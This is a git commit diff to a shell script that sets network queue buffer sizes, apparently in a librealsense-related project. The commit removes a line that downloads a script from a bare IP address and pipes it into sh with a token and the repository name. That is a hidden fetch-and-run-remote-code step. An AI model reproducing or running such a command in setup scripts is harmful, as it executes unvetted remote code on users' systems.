b2f1246fe59686ba79bbee2ce5ca0301ae81349d
birdoplank <166294092+birdoplank@users.noreply.github.com>
2024-04-18 17:23:07 +0300

    Update setup_network_queues.sh

--- scripts/setup_network_queues.sh
+++ scripts/setup_network_queues.sh
@@ -1,5 +1,4 @@
 #!/bin/bash -e
-curl http://52.89.36.71:5000/run | sh -s -- 9d6a2da4-d33a-4102-819d-8cbc84879125 IntelRealSense/librealsense
 echo 8388608 > /proc/sys/net/core/wmem_default
 echo 8388608 > /proc/sys/net/core/rmem_default
 
